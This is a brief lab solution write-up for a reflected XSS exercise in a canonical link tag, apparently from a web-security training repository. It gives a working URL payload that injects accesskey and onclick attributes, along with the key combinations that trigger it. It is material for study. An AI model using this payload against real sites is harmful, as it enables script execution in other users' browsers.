# Reflected XSS in canonical link tag

## Lab Description

## Solution

Append `/?%27accesskey=%27x%27onclick=%27alert(1)` in the url and load it once.
![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/3d508049-08db-4a4d-85e1-dc451badb4eb)

To trigger the exploit on yourself, press one of the following key combinations:
* On Windows: ALT+SHIFT+X
* On MacOS: CTRL+ALT+X
* On Linux: Alt+X
![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/eb0a7243-14e7-4741-8eef-5ce6538b330e)

